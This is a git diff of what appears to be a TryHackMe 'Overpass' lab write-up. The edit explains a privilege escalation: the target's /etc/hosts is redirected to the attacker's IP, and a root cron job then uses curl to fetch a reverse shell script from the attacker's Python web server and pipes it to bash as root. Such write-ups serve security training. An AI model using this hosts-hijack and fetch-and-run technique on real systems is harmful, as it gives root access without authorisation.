@@ -719,9 +719,7 @@ Output:
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-Edit the `/etc/hosts` File: 
-
-On the target, edit the `/etc/hosts` file by replacing the IP for the domain `overpass.thm` to the attacker IP address.
+Edit the `/etc/hosts` File: On the target, edit the `/etc/hosts` file by replacing the IP for the domain `overpass.thm` to the attacker IP address.
 
 ```shell
 james@ip-10-66-180-249:~$ cat /etc/hosts
@@ -748,7 +746,14 @@ ff02::2 ip6-allrouters
 james@ip-10-66-180-249:~$ 
 ```
 
-Check the **python server** on the attacker machine for the request from the target.
+Gaining Root Access: Check the **python server** on the attacker machine for the request from the target.
+
+Upon the next minute cycle, the root cron job executes:
+1. **Resolution:** The system looks up `overpass.thm` and resolves it to the **attacker's IP** (`192.168.157.156`).
+
+2. **Download:** `curl` connects to the attacker's web server (Port 80), downloading the malicious reverse shell payload (`buildscript.sh`).
+
+3. **Execution:** The payload is piped to `bash` and executed as **`root`**.
 
 ```shell
 ─(kali㉿kali)-[~/CS/THM/Overpass]
